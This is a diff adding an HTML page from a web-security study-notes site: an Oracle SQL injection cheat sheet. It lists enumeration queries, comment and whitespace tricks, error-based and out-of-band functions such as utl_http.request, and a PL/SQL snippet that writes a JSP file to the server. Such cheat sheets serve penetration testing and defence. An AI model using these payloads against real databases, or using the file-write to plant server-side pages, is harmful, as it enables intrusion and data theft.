@@ -1,0 +1,166 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Oracle Payload &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Oracle Payload</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/vuln/sql/cheatsheet/oracle.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="oracle-payload">
+<h1>Oracle Payload<a class="headerlink" href="#oracle-payload" title="Link to this heading"></a></h1>
+<section id="common-payloads">
+<h2>Common Payloads<a class="headerlink" href="#common-payloads" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>dump</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">v$tablespace;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">user_tables;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">column_name</span> <span class="pre">from</span> <span class="pre">user_tab_columns</span> <span class="pre">where</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'table_name';</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">column_name,</span> <span class="pre">data_type</span> <span class="pre">from</span> <span class="pre">user_tab_columns</span> <span class="pre">where</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'table_name';</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">ALL_TABLES</span></code></p></li>
+<li><p>Comment</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">--</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">/**/</span></code></p></li>
+<li><p>Space</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">0x00</span></code> <code class="docutils literal notranslate"><span class="pre">0x09</span></code> <code class="docutils literal notranslate"><span class="pre">0xa-0xd</span></code> <code class="docutils literal notranslate"><span class="pre">0x20</span></code></p></li>
+<li><p>Report an error</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_name</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ctxsys.drithsx.sn</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ctxsys.CTX_REPORT.TOKEN_TYPE</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">XMLType</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">dbms_xdb_version.checkin</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">dbms_xdb_version.makeversioned</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">dbms_xdb_version.uncheckout</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">dbms_utility.sqlid_to_sqlhash</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ordsys.ord_dicom.getmappingxpath</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_name</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_address</span></code></p></li>
+<li><p>OOB</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">utl_http.request</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_address</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">SYS.DBMS_LDAP.INIT</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">HTTPURITYPE</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">HTTP_URITYPE.GETCLOB</span></code></p></li>
+<li><p>Bypass</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">rawtohex</span></code></p></li>
+</ul>
+</section>
+<section id="write-a-file">
+<h2>Write a file<a class="headerlink" href="#write-a-file" title="Link to this heading"></a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span>
+</pre></div>
+</div>
+<p>create or replace directory TEST_DIR as ‘/path/to/dir’;
+grant read, write on directory TEST_DIR to system;
+declare
+isto_file utl_file.file_type;
+begin
+isto_file := utl_file.fopen(‘TEST_DIR’, ‘test.jsp’, ‘W’);
+utl_file.put_line(isto_file, ‘&lt;% out.println(“test”); %&gt;’);
+utl_file.fflush(isto_file);
+utl_file.fclose(isto_file);
+end;</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
